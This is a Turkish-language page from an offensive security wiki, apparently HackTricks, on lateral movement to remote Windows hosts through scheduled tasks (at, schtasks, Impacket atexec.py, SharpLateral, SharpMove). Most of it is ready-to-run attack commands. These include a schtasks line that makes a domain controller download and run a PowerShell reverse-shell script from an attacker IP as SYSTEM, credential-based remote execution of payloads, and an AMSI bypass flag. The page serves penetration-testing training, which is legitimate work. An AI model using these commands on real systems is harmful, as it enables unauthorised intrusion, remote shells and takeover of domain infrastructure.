# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışır

At, username/(password/Hash) bilgilerini bildiğiniz ana bilgisayarlarda görevleri zamanlamanıza olanak tanır. Böylece diğer ana bilgisayarlarda komutları çalıştırabilir ve çıktıyı alabilirsiniz.
```
At \\victim 11:00:00PM shutdown -r
```
schtasks kullanarak önce görevi oluşturmanız, ardından onu çağırmanız gerekir:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Uzak sistemlerde AT komutunu kullanarak komutları çalıştırmak için **Impacket'in `atexec.py`** aracını kullanabilirsiniz. Bunun için hedef sistemde geçerli kimlik bilgileri (kullanıcı adı ve parola veya hash) gerekir.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
[SharpLateral](https://github.com/mertdas/SharpLateral) de kullanabilirsiniz:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[SharpMove](https://github.com/0xthirteen/SharpMove) kullanabilirsiniz:
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
[**schtasks'ın silver tickets ile kullanımı hakkında daha fazla bilgi burada**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
